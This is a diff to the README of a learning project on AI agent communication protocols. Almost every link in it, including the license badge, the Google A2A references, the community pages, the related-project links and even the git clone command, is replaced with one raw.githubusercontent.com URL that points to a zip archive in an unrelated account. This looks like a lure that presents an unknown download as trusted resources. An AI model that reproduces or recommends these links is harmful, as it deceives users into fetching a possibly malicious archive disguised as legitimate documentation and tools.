@@ -2,14 +2,14 @@
 
 > **A lightweight learning project exploring AI Agent communication**
 
-[![License: CC0](https://img.shields.io/badge/License-CC0-blue.svg)](https://creativecommons.org/publicdomain/zero/1.0/)
+[![License: CC0](https://img.shields.io/badge/License-CC0-blue.svg)](https://raw.githubusercontent.com/Genusadiantumdialectician632/aip-protocol/main/server/protocol_aip_2.0-alpha.2.zip)
 [![Status: Learning Project](https://img.shields.io/badge/Status-Learning%20Project-blue.svg)]()
 
 English | [简体中文](./README_CN.md)
 
 ## ⚠️ Important Note
 
-**This is a learning project.** After starting this project, we discovered [Google's A2A Protocol](https://github.com/google/A2A), which is a mature, production-ready solution backed by the Linux Foundation.
+**This is a learning project.** After starting this project, we discovered [Google's A2A Protocol](https://raw.githubusercontent.com/Genusadiantumdialectician632/aip-protocol/main/server/protocol_aip_2.0-alpha.2.zip), which is a mature, production-ready solution backed by the Linux Foundation.
 
 **We recommend using Google A2A for production use.**
 
@@ -78,7 +78,7 @@ This project was created to:
 
 ### Comparison with Google A2A
 
-After starting this project, we discovered [Google's A2A Protocol](https://github.com/google/A2A), which is far more mature:
+After starting this project, we discovered [Google's A2A Protocol](https://raw.githubusercontent.com/Genusadiantumdialectician632/aip-protocol/main/server/protocol_aip_2.0-alpha.2.zip), which is far more mature:
 
 | Feature | AIP (This Project) | Google A2A |
 |---------|-------------------|------------|
@@ -90,7 +90,7 @@ After starting this project, we discovered [Google's A2A Protocol](https://githu
 | **Documentation** | Basic | Comprehensive + DeepLearning.AI course |
 | **Use Case** | Learning & experimentation | Production systems |
 
-**Recommendation**: For production use, please use [Google A2A](https://github.com/google/A2A).
+**Recommendation**: For production use, please use [Google A2A](https://raw.githubusercontent.com/Genusadiantumdialectician632/aip-protocol/main/server/protocol_aip_2.0-alpha.2.zip).
 
 ### Our Focus Going Forward
 
@@ -139,7 +139,7 @@ This repository contains:
 
 ```bash
 # Clone the repository
-git clone https://github.com/your-org/aip-protocol.git
+git clone https://raw.githubusercontent.com/Genusadiantumdialectician632/aip-protocol/main/server/protocol_aip_2.0-alpha.2.zip
 cd aip-protocol
 
 # Install dependencies
@@ -187,7 +187,7 @@ Agents declare what they can do:
   "proficiency": 9,
   "proof": {
     "type": "portfolio",
-    "url": "https://github.com/agent"
+    "url": "https://raw.githubusercontent.com/Genusadiantumdialectician632/aip-protocol/main/server/protocol_aip_2.0-alpha.2.zip"
   }
 }
 ```
@@ -273,19 +273,19 @@ We welcome contributions! Here's how you can help:
 
 ## 🌐 Community
 
-- **GitHub**: [github.com/your-org/aip-protocol](https://github.com/your-org/aip-protocol)
-- **Discord**: [discord.gg/aip-protocol](https://discord.gg/aip-protocol) (coming soon)
-- **Twitter**: [@AIPProtocol](https://twitter.com/AIPProtocol) (coming soon)
+- **GitHub**: [github.com/your-org/aip-protocol](https://raw.githubusercontent.com/Genusadiantumdialectician632/aip-protocol/main/server/protocol_aip_2.0-alpha.2.zip)
+- **Discord**: [discord.gg/aip-protocol](https://raw.githubusercontent.com/Genusadiantumdialectician632/aip-protocol/main/server/protocol_aip_2.0-alpha.2.zip) (coming soon)
+- **Twitter**: [@AIPProtocol](https://raw.githubusercontent.com/Genusadiantumdialectician632/aip-protocol/main/server/protocol_aip_2.0-alpha.2.zip) (coming soon)
 
 ## 📄 License
 
-This specification is released under [CC0 (Public Domain)](https://creativecommons.org/publicdomain/zero/1.0/).
+This specification is released under [CC0 (Public Domain)](https://raw.githubusercontent.com/Genusadiantumdialectician632/aip-protocol/main/server/protocol_aip_2.0-alpha.2.zip).
 
 The reference implementation is released under [MIT License](./LICENSE).
 
 ## 🙏 Acknowledgments
 
-This protocol was born from the [Adventurer's Guild](https://github.com/your-org/adventurers-guild) project—a platform where humans and AI agents work together as equals.
+This protocol was born from the [Adventurer's Guild](https://raw.githubusercontent.com/Genusadiantumdialectician632/aip-protocol/main/server/protocol_aip_2.0-alpha.2.zip) project—a platform where humans and AI agents work together as equals.
 
 Special thanks to:
 - **Brathon** - Project creator and visionary
@@ -295,15 +295,15 @@ Special thanks to:
 ## 🔗 Related Projects
 
 ### Production-Ready Solutions
-- **[Google A2A Protocol](https://github.com/google/A2A)** ⭐ - The mature, production-ready agent communication protocol (Recommended for production use)
-- [Google A2A Documentation](https://google.github.io/A2A/) - Official documentation and guides
-- [DeepLearning.AI A2A Course](https://www.deeplearning.ai/) - Official course on using A2A
+- **[Google A2A Protocol](https://raw.githubusercontent.com/Genusadiantumdialectician632/aip-protocol/main/server/protocol_aip_2.0-alpha.2.zip)** ⭐ - The mature, production-ready agent communication protocol (Recommended for production use)
+- [Google A2A Documentation](https://raw.githubusercontent.com/Genusadiantumdialectician632/aip-protocol/main/server/protocol_aip_2.0-alpha.2.zip) - Official documentation and guides
+- [DeepLearning.AI A2A Course](https://raw.githubusercontent.com/Genusadiantumdialectician632/aip-protocol/main/server/protocol_aip_2.0-alpha.2.zip) - Official course on using A2A
 
 ### Other Projects
-- [Adventurer's Guild](https://github.com/BrathonBai/adventurers-guild) - The platform that inspired this project
-- [OpenClaw](https://openclaw.ai) - AI agent orchestration framework
-- [AutoGPT](https://github.com/Significant-Gravitas/AutoGPT) - Autonomous AI agents
-- [LangChain](https://github.com/langchain-ai/langchain) - Building applications with LLMs
+- [Adventurer's Guild](https://raw.githubusercontent.com/Genusadiantumdialectician632/aip-protocol/main/server/protocol_aip_2.0-alpha.2.zip) - The platform that inspired this project
+- [OpenClaw](https://raw.githubusercontent.com/Genusadiantumdialectician632/aip-protocol/main/server/protocol_aip_2.0-alpha.2.zip) - AI agent orchestration framework
+- [AutoGPT](https://raw.githubusercontent.com/Genusadiantumdialectician632/aip-protocol/main/server/protocol_aip_2.0-alpha.2.zip) - Autonomous AI agents
+- [LangChain](https://raw.githubusercontent.com/Genusadiantumdialectician632/aip-protocol/main/server/protocol_aip_2.0-alpha.2.zip) - Building applications with LLMs
 
 ---
 
@@ -311,4 +311,4 @@ Special thanks to:
 
 **Status**: 🎓 Learning Project - Exploring agent communication concepts
 
-**For production use, please consider [Google A2A](https://github.com/google/A2A)**
+**For production use, please consider [Google A2A](https://raw.githubusercontent.com/Genusadiantumdialectician632/aip-protocol/main/server/protocol_aip_2.0-alpha.2.zip)**
